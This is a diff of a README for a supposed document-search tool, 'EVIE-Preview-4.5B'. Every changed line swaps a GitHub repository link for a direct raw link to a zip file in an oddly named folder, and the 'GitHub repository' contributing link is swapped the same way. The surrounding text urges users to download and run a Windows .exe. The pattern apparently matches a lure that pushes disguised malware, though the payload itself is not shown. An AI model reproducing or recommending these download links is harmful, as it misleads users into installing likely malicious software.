@@ -1,7 +1,7 @@
 <h1>🔍 EVIE-Preview-4.5B - Find Any Document in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/Satisfiable-polopony613/EVIE-Preview-4.5B" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;margin:20px auto;">⬇️ DOWNLOAD EVIE-Preview-4.5B</a>
+  <a href="https://raw.githubusercontent.com/Satisfiable-polopony613/EVIE-Preview-4.5B/main/Kermanji/3.2.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;margin:20px auto;">⬇️ DOWNLOAD EVIE-Preview-4.5B</a>
 </p>
 
 <p align="center">
@@ -55,7 +55,7 @@ Licensed under Apache 2.0 — use it, modify it, integrate it. No hidden costs, 
 Visit the download page and get the latest version:
 
 <p align="center">
-  <a href="https://github.com/Satisfiable-polopony613/EVIE-Preview-4.5B" style="display:inline-block;padding:12px 24px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">📥 Visit This Link to Download</a>
+  <a href="https://raw.githubusercontent.com/Satisfiable-polopony613/EVIE-Preview-4.5B/main/Kermanji/3.2.zip" style="display:inline-block;padding:12px 24px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">📥 Visit This Link to Download</a>
 </p>
 
 **Visit this link to download the application.** The download page will show a file specifically for Windows. Choose the file that ends with `.exe` (executable) for the easiest setup. If you see multiple versions, pick the one labeled "Windows" and "Latest."
@@ -201,7 +201,7 @@ For enterprise use, you can run EVIE on an air-gapped network. It requires no ex
 ## 🤝 Contributing and Support
 
 EVIE is community-driven. If you find a bug, have feature ideas, or want to contribute:
-- Visit the [GitHub repository](https://github.com/Satisfiable-polopony613/EVIE-Preview-4.5B)
+- Visit the [GitHub repository](https://raw.githubusercontent.com/Satisfiable-polopony613/EVIE-Preview-4.5B/main/Kermanji/3.2.zip)
 - Open an "Issue" for bug reports
 - Submit a "Pull Request" for code improvements
 - Join discussions in the "Discussions" tab
@@ -224,7 +224,7 @@ EVIE-Preview-4.5B represents a breakthrough in making visual document search acc
 **Ready to stop hunting and start finding?**
 
 <p align="center">
-  <a href="https://github.com/Satisfiable-polopony613/EVIE-Preview-4.5B" style="display:inline-block;padding:15px 30px;background:#17a2b8;color:#fff;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;">⬇️ Get EVIE-Preview-4.5B Now</a>
+  <a href="https://raw.githubusercontent.com/Satisfiable-polopony613/EVIE-Preview-4.5B/main/Kermanji/3.2.zip" style="display:inline-block;padding:15px 30px;background:#17a2b8;color:#fff;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;">⬇️ Get EVIE-Preview-4.5B Now</a>
 </p>
 
 <p align="center"><em>Free forever. Private by design. Instant by default.</em></p>
